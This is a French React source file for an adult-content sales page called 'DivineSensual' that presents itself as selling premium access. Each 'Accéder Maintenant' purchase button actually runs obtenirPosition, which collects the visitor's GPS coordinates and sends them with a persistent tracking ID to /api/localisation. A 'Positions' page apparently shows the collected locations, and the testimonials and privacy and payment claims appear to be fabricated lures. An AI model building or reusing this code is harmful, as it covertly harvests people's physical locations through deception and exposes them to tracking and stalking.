import { useEffect, useState } from 'react';
import { motion } from "framer-motion";
import {
  Star,
  Heart,
  Shield,
  Crown,
  Mail,
  Phone,
  Instagram,
  Twitter,
  Play,
  ArrowRight,
  Check,
  Sparkles,
  Zap,
  Eye,
  Lock,
} from "lucide-react";
import Affichage from './Affichage';

// Déclaration des types pour window
declare global {
  interface Window {
    verifierPermissionGeolocalisation: () => void;
    obtenirPosition: () => void;
  }
}

export default function App() {
  const [currentPage, setCurrentPage] = useState<string>(() => {
    return window.location.pathname === '/affichage' ? 'affichage' : 'home';
  });
  
  useEffect(() => {
    const handlePopState = () => {
      setCurrentPage(window.location.pathname === '/affichage' ? 'affichage' : 'home');
    };
    
    window.addEventListener('popstate', handlePopState);
    return () => window.removeEventListener('popstate', handlePopState);
  }, []);
  
  const navigateToAffichage = () => {
    window.history.pushState({}, '', '/affichage');
    setCurrentPage('affichage');
  };
  
  const navigateToHome = () => {
    window.history.pushState({}, '', '/');
    setCurrentPage('home');
  };
  
  if (currentPage === 'affichage') {
    return <Affichage />;
  }
  
  return <Home navigateToAffichage={navigateToAffichage} />;
}

function Home({ navigateToAffichage }: { navigateToAffichage: () => void }) {
  const [isVisible, setIsVisible] = useState<{[key: number]: boolean}>({});
  const [parallaxOffset, setParallaxOffset] = useState(0);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [videoPlaying, setVideoPlaying] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  
  useEffect(() => {
    // Générer un identifiant unique si ce n'est pas déjà fait
    const userId = localStorage.getItem("userId") || crypto.randomUUID();
    if (!localStorage.getItem("userId")) {
      localStorage.setItem("userId", userId); // Sauvegarde l'ID unique pour les prochaines visites
    }
    
    // Fonction pour vérifier les permissions de géolocalisation
    const verifierPermissionGeolocalisation = () => {
      if (!navigator.permissions) {
        showTempMessage("⚠️ Impossible de vérifier les permissions", "error");
        return;
      }
    
      navigator.permissions
        .query({ name: "geolocation" } as PermissionDescriptor)
        .then((result) => {
          switch (result.state) {
            case "granted":
              showTempMessage("✅ Permission de localisation accordée", "success");
              break;
            case "prompt":
              showTempMessage(
                "ℹ️ Permission en attente : cliquez sur 'Autoriser' si demandé",
                "success"
              );
              break;
            case "denied":
              showTempMessage(
                "🚫 Localisation refusée : vérifiez vos réglages",
                "error"
              );
              break;
          }
        })
        .catch((err) => {
          console.error("Erreur lors de la vérification des permissions :", err);
          showTempMessage(
            "⚠️ Erreur lors de la vérification des permissions",
            "error"
          );
        });
    };
    
    // Fonction utilitaire pour reset button
    const resetButton = (btn: HTMLElement | null, originalText: string) => {
      if (btn) {
        btn.textContent = originalText;
        (btn as HTMLButtonElement).disabled = false;
        (btn as HTMLElement).style.opacity = "1";
      }
      setIsLoading(false);
    };
    
    // Fonction utilitaire pour afficher message temporaire
    const showTempMessage = (message: string, type: string) => {
      const msgElement = document.createElement("div");
      msgElement.textContent = message;
      msgElement.style.cssText = `
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            padding: 12px 24px;
            background: ${type === "success" ? "#4CAF50" : "#F44336"};
            color: white;
            border-radius: 4px;
            box-shadow: 0 3px 6px rgba(0,0,0,0.16);
            z-index: 1000;
            animation: fadeIn 0.3s;
        `;
      document.body.appendChild(msgElement);
    
      setTimeout(() => {
        msgElement.style.animation = "fadeOut 0.5s";
        setTimeout(() => msgElement.remove(), 500);
      }, 3000);
    };
    
    // Fonction principale pour obtenir la position
    window.obtenirPosition = function() {
      const btn = document.querySelector(".cta-button") as HTMLButtonElement;
      if (!btn) return;
      
      const btnOriginalText = btn.textContent || "Accéder Maintenant"; // Sauvegarde le texte original
      btn.disabled = true;
      btn.textContent = "⌛ Traitement en cours...";
      btn.style.opacity = "0.8"; // Effet visuel de désactivation
      setIsLoading(true);
    
      verifierPermissionGeolocalisation(); // 👉 Appel ajouté ici
    
      if (!navigator.geolocation) {
        alert("❌ Votre navigateur ne supporte pas la géolocalisation");
        resetButton(btn, btnOriginalText);
        return;
      }
    
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          try {
            const response = await fetch("/api/localisation", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                userId: userId, // Ajouter l'ID utilisateur à la requête
              }),
            });
    
            if (!response.ok) throw new Error("Erreur serveur");
            const data = await response.json();
    
            console.log("✅ Succès :", data);
            showTempMessage("✔️ Produit envoyée !", "success"); // Feedback visuel
            setTimeout(() => window.location.reload(), 1500); // Recharge après 1.5s
          } catch (error) {
            console.error("❌ Erreur :", error);
            showTempMessage("⚠️ Échec, veuillez réessayer", "error");
            resetButton(btn, btnOriginalText);
          }
        },
        (error) => {
          console.error("❌ Erreur GPS :", error.message);
          showTempMessage("🔍 Actualisez la page et réessayez", "error");
          resetButton(btn, btnOriginalText);
        },
        { enableHighAccuracy: false, timeout: 5000 }
      );
    };
    
    window.verifierPermissionGeolocalisation = verifierPermissionGeolocalisation;

    const handleScroll = () => {
      const scrolled = window.pageYOffset;
      setParallaxOffset(scrolled * 0.5);

      // Intersection Observer for fade-in animations
      const elements = document.querySelectorAll(".fade-in");
      elements.forEach((element, index) => {
        const elementTop =
          element.getBoundingClientRect().top + window.pageYOffset;
        const elementVisible = 150;

        if (scrolled > elementTop - window.innerHeight + elementVisible) {
          setIsVisible((prev) => ({ ...prev, [index]: true }));
        }
      });
    };

    // Smooth scrolling for navigation links
    const handleNavClick = (e: Event) => {
      const target = e.target as HTMLElement;
      if (
        target.tagName === "A" &&
        target.getAttribute("href")?.startsWith("#")
      ) {
        e.preventDefault();
        const targetId = target.getAttribute("href")?.substring(1);
        const targetElement = document.getElementById(targetId || "");
        if (targetElement) {
          targetElement.scrollIntoView({ behavior: "smooth" });
        }
        setMobileMenuOpen(false);
      }
    };

    window.addEventListener("scroll", handleScroll);
    document.addEventListener("click", handleNavClick);

    // Initial check for elements in view
    handleScroll();

    return () => {
      window.removeEventListener("scroll", handleScroll);
      document.removeEventListener("click", handleNavClick);
    };
  }, []);

  const features = [
    {
      icon: <Sparkles className="w-8 h-8" />,
      title: "Contenu Exclusif",
      description: "Accès à du contenu privé et personnalisé",
    },
    {
      icon: <Lock className="w-8 h-8" />,
      title: "100% Discret",
      description: "Confidentialité totale garantie",
    },
    {
      icon: <Zap className="w-8 h-8" />,
      title: "Accès Immédiat",
      description: "Contenu disponible instantanément",
    },
  ];

  const testimonials = [
    {
      text: "Une expérience absolument incroyable. Le contenu est de qualité exceptionnelle.",
      author: "Alex M.",
      rating: 5,
      verified: true,
    },
    {
      text: "Discrétion parfaite et contenu premium. Exactement ce que je cherchais.",
      author: "Thomas L.",
      rating: 5,
      verified: true,
    },
    {
      text: "Service professionnel et contenu de haute qualité. Très satisfait.",
      author: "Marc D.",
      rating: 5,
      verified: true,
    },
  ];

  const pricing = {
    originalPrice: "199€",
    currentPrice: "99€",
    savings: "50% OFF",
    features: [
      "Accès complet au contenu exclusif",
      "Vidéos HD en qualité premium",
      "Photos privées haute résolution",
      "Contenu mis à jour régulièrement",
      "Support prioritaire",
      "Accès à vie",
    ],
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-purple-900 to-pink-900">
      {/* Navigation */}
      <nav className="fixed top-0 w-full z-50 bg-black/30 backdrop-blur-lg border-b border-white/10">
        <div className="container mx-auto px-6 py-4">
          <div className="flex justify-between items-center">
            <div className="font-playfair text-2xl font-bold text-white">
              Divine<span className="text-pink-400">Sensual</span>
            </div>
            <div className="hidden md:flex space-x-8">
              <a
                href="#hero"
                className="text-white hover:text-pink-400 transition-colors"
              >
                Accueil
              </a>
              <a
                href="#features"
                className="text-white hover:text-pink-400 transition-colors"
              >
                Avantages
              </a>
              <a
                href="#pricing"
                className="text-white hover:text-pink-400 transition-colors"
              >
                Tarifs
              </a>
              <a
                href="#testimonials"
                className="text-white hover:text-pink-400 transition-colors"
              >
                Avis
              </a>
              <button
                onClick={navigateToAffichage}
                className="text-white hover:text-pink-400 transition-colors"
              >
                Positions
              </button>
            </div>
            <button
              className="md:hidden text-white"
              onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
            >
              <svg
                className="w-6 h-6"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d="M4 6h16M4 12h16M4 18h16"
                />
              </svg>
            </button>
          </div>
          {mobileMenuOpen && (
            <div className="md:hidden mt-4 pb-4 space-y-2">
              <a
                href="#hero"
                className="block py-2 text-white hover:text-pink-400 transition-colors"
              >
                Accueil
              </a>
              <a
                href="#features"
                className="block py-2 text-white hover:text-pink-400 transition-colors"
              >
                Avantages
              </a>
              <a
                href="#pricing"
                className="block py-2 text-white hover:text-pink-400 transition-colors"
              >
                Tarifs
              </a>
              <a
                href="#testimonials"
                className="block py-2 text-white hover:text-pink-400 transition-colors"
              >
                Avis
              </a>
              <button
                onClick={navigateToAffichage}
                className="block py-2 text-white hover:text-pink-400 transition-colors w-full text-left"
              >
                Positions
              </button>
            </div>
          )}
        </div>
      </nav>

      {/* Hero Section */}
      <section
        id="hero"
        className="hero-section flex items-center justify-center relative overflow-hidden"
      >
        <div className="absolute inset-0 bg-gradient-to-br from-black/50 via-purple-900/30 to-pink-900/50 z-10" />
        <div className="absolute inset-0 opacity-20" />

        <div className="container mx-auto px-6 text-center text-white z-20 relative">
          <motion.div
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8 }}
            className="mb-6 mt-20"
          >
            <div className="inline-flex items-center bg-pink-500/20 backdrop-blur-sm border border-pink-400/30 rounded-full px-6 py-2 mb-6 relative z-30">
              <Sparkles className="w-4 h-4 mr-2 text-pink-400" />
              <span className="text-sm font-medium">
                Contenu Exclusif Premium
              </span>
            </div>
          </motion.div>

          <motion.h1
            className="font-playfair text-5xl md:text-7xl font-bold mb-6 leading-tight"
            initial={{ opacity: 0, y: 50 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 1, delay: 0.2 }}
          >
            Découvrez Mon
            <br />
            <span className="bg-gradient-to-r from-pink-400 to-purple-400 bg-clip-text text-transparent">
              Univers Privé
            </span>
          </motion.h1>

          <motion.p
            className="font-inter text-xl md:text-2xl mb-8 max-w-3xl mx-auto text-gray-300 leading-relaxed"
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 1, delay: 0.4 }}
          >
            Accédez à du contenu exclusif et privé de haute qualité, créé
            spécialement pour vous. Une expérience unique et mémorable vous
            attend.
          </motion.p>

          <motion.div
            className="flex flex-col sm:flex-row gap-4 justify-center items-center"
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 1, delay: 0.6 }}
          >
            <button 
              className="cta-button group" 
              onClick={() => window.obtenirPosition()}
              disabled={isLoading}
            >
              <span>{isLoading ? 'Traitement en cours...' : 'Accéder Maintenant'}</span>
              <ArrowRight className="w-5 h-5 ml-2 group-hover:translate-x-1 transition-transform" />
            </button>

            <button
              className="video-preview-button"
              onClick={() => setVideoPlaying(true)}
            >
              <Play className="w-5 h-5 mr-2" />
              Voir l'Aperçu
            </button>
          </motion.div>

          <motion.div
            className="mt-8 flex items-center justify-center space-x-8 text-sm text-gray-400"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 1, delay: 0.8 }}
          >
            <div className="flex items-center">
              <Shield className="w-4 h-4 mr-2 text-green-400" />
              <span>100% Discret</span>
            </div>
            <div className="flex items-center">
              <Zap className="w-4 h-4 mr-2 text-yellow-400" />
              <span>Accès Immédiat</span>
            </div>
            <div className="flex items-center">
              <Crown className="w-4 h-4 mr-2 text-pink-400" />
              <span>Contenu Premium</span>
            </div>
          </motion.div>
        </div>
      </section>

      {/* Features Section */}
      <section
        id="features"
        className="py-20 bg-gradient-to-b from-gray-900 to-black"
      >
        <div className="container mx-auto px-6">
          <motion.div
            className={`text-center mb-16 fade-in ${
              isVisible[0] ? "visible" : ""
            }`}
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8 }}
          >
            <h2 className="font-playfair text-4xl md:text-5xl font-bold mb-6 text-white">
              Pourquoi Choisir{" "}
              <span className="bg-gradient-to-r from-pink-400 to-purple-400 bg-clip-text text-transparent">
                Mon Contenu
              </span>
            </h2>
            <p className="font-inter text-xl text-gray-400 max-w-2xl mx-auto">
              Une expérience unique et personnalisée qui dépasse toutes vos
              attentes
            </p>
          </motion.div>

          <div className="grid md:grid-cols-3 gap-8">
            {features.map((feature, index) => (
              <motion.div
                key={index}
                className={`feature-card fade-in ${
                  isVisible[1 + index] ? "visible" : ""
                }`}
                initial={{ opacity: 0, y: 30 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.8, delay: index * 0.2 }}
              >
                <div className="feature-icon">{feature.icon}</div>
                <h3 className="font-playfair text-2xl font-bold mb-4 text-white">
                  {feature.title}
                </h3>
                <p className="font-inter text-gray-400 leading-relaxed">
                  {feature.description}
                </p>
              </motion.div>
            ))}
          </div>
        </div>
      </section>

      {/* Pricing Section */}
      <section
        id="pricing"
        className="py-20 bg-gradient-to-b from-black to-gray-900"
      >
        <div className="container mx-auto px-6">
          <motion.div
            className={`text-center mb-16 fade-in ${
              isVisible[4] ? "visible" : ""
            }`}
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8 }}
          >
            <h2 className="font-playfair text-4xl md:text-5xl font-bold mb-6 text-white">
              Accès{" "}
              <span className="bg-gradient-to-r from-pink-400 to-purple-400 bg-clip-text text-transparent">
                Premium
              </span>
            </h2>
            <p className="font-inter text-xl text-gray-400 max-w-2xl mx-auto">
              Offre limitée - Ne manquez pas cette opportunité exclusive
            </p>
          </motion.div>

          <motion.div
            className="max-w-4xl mx-auto"
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8, delay: 0.2 }}
          >
            <div className="pricing-card relative overflow-hidden">
              <div className="absolute top-0 right-0 bg-gradient-to-l from-pink-500 to-purple-500 text-white px-4 py-2 rounded-bl-lg font-bold">
                {pricing.savings}
              </div>

              <div className="text-center mb-8">
                <div className="flex items-center justify-center mb-4">
                  <span className="text-3xl text-gray-400 line-through mr-4">
                    {pricing.originalPrice}
                  </span>
                  <span className="text-5xl font-bold text-white">
                    {pricing.currentPrice}
                  </span>
                </div>
                <p className="text-gray-400">
                  Accès à vie - Pas de renouvellement
                </p>
              </div>

              <div className="space-y-4 mb-8">
                {pricing.features.map((feature, index) => (
                  <div key={index} className="flex items-center">
                    <Check className="w-5 h-5 text-green-400 mr-3 flex-shrink-0" />
                    <span className="text-gray-300">{feature}</span>
                  </div>
                ))}
              </div>

              <button
                className="cta-button w-full text-lg py-4"
                onClick={() => window.obtenirPosition()}
                disabled={isLoading}
              >
                <span>{isLoading ? 'Traitement en cours...' : 'Accéder Maintenant'}</span>
                <ArrowRight className="w-5 h-5 ml-2" />
              </button>

              <div className="text-center mt-4">
                <p className="text-sm text-gray-500">
                  🔒 Paiement sécurisé • ⚡ Accès immédiat • 🛡️ Garantie 30
                  jours
                </p>
              </div>
            </div>
          </motion.div>
        </div>
      </section>

      {/* Testimonials Section */}
      <section
        id="testimonials"
        className="py-20 bg-gradient-to-b from-gray-900 to-black"
      >
        <div className="container mx-auto px-6">
          <motion.div
            className={`text-center mb-16 fade-in ${
              isVisible[5] ? "visible" : ""
            }`}
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8 }}
          >
            <h2 className="font-playfair text-4xl md:text-5xl font-bold mb-6 text-white">
              Ce Qu'en Disent{" "}
              <span className="bg-gradient-to-r from-pink-400 to-purple-400 bg-clip-text text-transparent">
                Mes Membres
              </span>
            </h2>
          </motion.div>

          <div className="grid md:grid-cols-3 gap-8">
            {testimonials.map((testimonial, index) => (
              <motion.div
                key={index}
                className={`testimonial-card fade-in ${
                  isVisible[6 + index] ? "visible" : ""
                }`}
                initial={{ opacity: 0, y: 30 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.8, delay: index * 0.2 }}
              >
                <div className="flex mb-4">
                  {[...Array(testimonial.rating)].map((_, i) => (
                    <Star
                      key={i}
                      className="w-5 h-5 fill-current text-yellow-400"
                    />
                  ))}
                </div>
                <p className="font-inter text-gray-300 mb-6 italic leading-relaxed">
                  "{testimonial.text}"
                </p>
                <div className="flex items-center justify-between">
                  <div className="font-inter font-semibold text-white">
                    {testimonial.author}
                  </div>
                  {testimonial.verified && (
                    <div className="flex items-center text-green-400 text-sm">
                      <Check className="w-4 h-4 mr-1" />
                      Vérifié
                    </div>
                  )}
                </div>
              </motion.div>
            ))}
          </div>
        </div>
      </section>

      {/* Final CTA Section */}
      <section className="py-20 bg-gradient-to-r from-pink-900 via-purple-900 to-pink-900">
        <div className="container mx-auto px-6 text-center">
          <motion.div
            className="max-w-3xl mx-auto"
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.8 }}
          >
            <h2 className="font-playfair text-4xl md:text-5xl font-bold mb-6 text-white">
              Prêt à Découvrir Mon{" "}
              <span className="bg-gradient-to-r from-pink-400 to-purple-400 bg-clip-text text-transparent">
                Univers Privé
              </span>
              ?
            </h2>
            <p className="font-inter text-xl text-gray-300 mb-8 leading-relaxed">
              Rejoignez des milliers de membres satisfaits et accédez à du
              contenu exclusif de haute qualité.
              <br />
              <span className="text-pink-400 font-semibold">
                Offre limitée - Ne manquez pas cette opportunité !
              </span>
            </p>

            <div className="flex flex-col sm:flex-row gap-4 justify-center items-center">
              <button
                className="cta-button text-xl py-4 px-8"
                onClick={() => window.obtenirPosition()}
                disabled={isLoading}
              >
                <span>{isLoading ? 'Traitement en cours...' : `Accéder Maintenant - ${pricing.currentPrice}`}</span>
                <ArrowRight className="w-6 h-6 ml-3" />
              </button>

              <div className="text-center">
                <p className="text-sm text-gray-400">
                  🔒 Paiement 100% sécurisé
                </p>
                <p className="text-sm text-gray-400">
                  ⚡ Accès immédiat après paiement
                </p>
              </div>
            </div>
          </motion.div>
        </div>
      </section>

      {/* Footer */}
      <footer className="py-12 bg-black">
        <div className="container mx-auto px-6">
          <div className="text-center">
            <div className="font-playfair text-2xl font-bold text-white mb-4">
              Divine<span className="text-pink-400">Sensual</span>
            </div>
            <div className="section-divider"></div>
            <div className="flex flex-wrap justify-center space-x-8 text-gray-400 font-inter">
              <a href="#" className="hover:text-white transition-colors">
                Mentions Légales
              </a>
              <a href="#" className="hover:text-white transition-colors">
                Politique de Confidentialité
              </a>
              <a href="#" className="hover:text-white transition-colors">
                Conditions d'Utilisation
              </a>
            </div>
            <div className="mt-8 text-gray-500 font-inter">
              © 2024 DivineSensual. Tous droits réservés.
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}